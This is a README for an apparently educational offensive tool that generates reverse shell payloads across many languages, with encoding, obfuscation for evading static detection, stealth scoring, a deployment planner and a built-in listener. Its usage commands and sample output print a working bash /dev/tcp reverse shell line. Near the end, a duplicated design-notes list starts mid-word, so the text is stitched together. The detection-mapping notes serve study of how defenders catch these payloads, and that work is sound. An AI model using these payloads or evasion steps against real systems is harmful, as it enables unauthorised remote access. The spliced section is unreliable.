# Project 05 — Professional Shell Payload Generator

**Author: Kuldeep Singh**

---

**Advanced payload orchestration engine featuring 25+ reverse shell templates across 12 languages, integrated encoding, OPSEC-aware obfuscation, and tactical deployment planning.**

## Security Researcher Perspective

Generating a payload is the "Initial Access" phase of most simulated attacks. This tool elevates the process from simple copy-pasting to **Payload Engineering**. It provides researchers with a structured database of templates that include metadata on **Stealth Scores** and **Detection Footprints**, mapping directly to how modern EDR and SIEM solutions (Sigma, YARA, Suricata) identify malicious activity.

## Technical Differentiators

| Feature | Standard Generator | This Payload Engine |
|---------|----------------|----------------|
| **Template Logic** | Hard-coded strings | **Typed `PayloadTemplate` Objects** with metadata |
| **Encoding Suite** | Plain text only | **Multi-stage**: Base64, URL, PowerShell `EncodedCommand` |
| **Obfuscation** | None | **OPSEC-Focused**: Variable randomization & IP splitting |
| **Stealth Profiling** | Manual guess | **Quantitative Stealth Scoring** (1–10) |
| **Tactical Planning** | Payload only | **4-Step Deployment Workflow** (Listener → Host → Execute → Stabilize) |
| **Integrated Listener** | Requires `nc` | **Built-in Threaded TCP Listener** |
| **Reporting** | Console output | **Professional Cheat Sheet & JSON export** |

## Usage

```bash
# Intelligence: List all 25+ available templates
python3 shellgen.py --list

# Payload Generation: Standard bash reverse shell
python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --name bash-tcp

# Evasion: Base64-encode to bypass static string matching
python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --name python3-socket --encode b64

# OPSEC: Apply variable randomization and IP obfuscation
python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --name bash-tcp --obfuscate

# Tactical Mapping: Generate complete 4-step deployment plan
python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --name bash-fifo --plan

# Stealth Filtering: Identify high-stealth Linux payloads (Score 6+)
python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --platform linux --min-stealth 6

# Direct Action: Start integrated TCP listener for incoming shells
python3 shellgen.py --listen 4444
```

## Sample Output

```text
  shellgen.py  |  lhost=192.168.100.10  lport=4444

  NAME                   LANG         PLATFORM   STEALTH                DESCRIPTION
  ─────────────────────  ───────────  ─────────  ─────────────────────  ─────────────────────────────────────
  bash-tcp               bash         linux      ██░░░░░░░░ 2/10        Classic bash /dev/tcp redirect
  bash-fifo              bash         linux      █████░░░░░ 5/10        Named pipe shell — avoids /dev/tcp
  python3-socket         python3      any        █████░░░░░ 5/10        Python3 socket + pty.spawn
  socat-ssl              socat        linux      ████████░░ 8/10        socat SSL-encrypted PTY shell
  ...


  ╔══ BASH-TCP — Classic bash /dev/tcp redirect ═════════════════════
  ║  Language  : bash
  ║  Stealth   : ██░░░░░░░░ 2/10
  ╠══ PAYLOAD
  ║  bash -i >& /dev/tcp/192.168.100.10/4444 0>&1
  ╠══ OPSEC NOTES
  ║  ▸ Spawns 'bash -i' which is flagged by most EDR behavioral rules
  ║  ▸ '/dev/tcp' string matches high-fidelity SIGMA signatures
  ║  ▸ RECOMMENDATION: Use only in noisy legacy or lab environments
  ╚══════════════════════════════════════════════════════════════════
```

## Engineering & Design Decisions

- **Immutable Template Core**: Utilizes `Frozen Dataclasses` for the `PayloadTemplate` database, ensuring that core payload definitions remain consistent and thread-safe throughout the session.
- **Decoupled Encoding Engine**: Implements a standalone `EncodingEngine` class. Templates declare their compatibility, preventing invalid operations like applying PowerShell encoding to a Ruby payload.
- **Detection-Led OPSEC Notes**: Each payload includes forensic-grade detection notes mapping to real-world defensive telemetry (Sigma, Suricata, YARA), bridging the gap between offensive execution and defensive visibility.
- **Strategic Deployment Planner**: Automates the generation of a 4-step workflow, covering listener setup, payload hosting (via temporary HTTP servers), execution strings, and post-exploit PTY stabilization.
- **Threaded Async Listener**: The built-in `--listen` mode spawns a background receiver thread, allowing the researcher to interact with multiple incoming shells without blocking the main engine's input.
rate from templates** — the `EncodingEngine` is a pure static class; templates declare which encodings they support via their `encodable` list, so you can never accidentally apply `ps_enc` to a bash payload
- **OPSEC notes mirror real detection engineering** — each note describes exactly what a Sigma/Suricata/YARA rule would match, teaching both the attack technique and how defenders catch it
- **Obfuscation is intentionally shallow** — the goal is to illustrate the concept (break static string matching) not to implement actual AV evasion; deeper obfuscation is a module 3+ topic
- **`--listen` uses threading** — the receive loop runs in a daemon thread while the main thread handles stdin, so you can type commands and receive output simultaneously without blocking
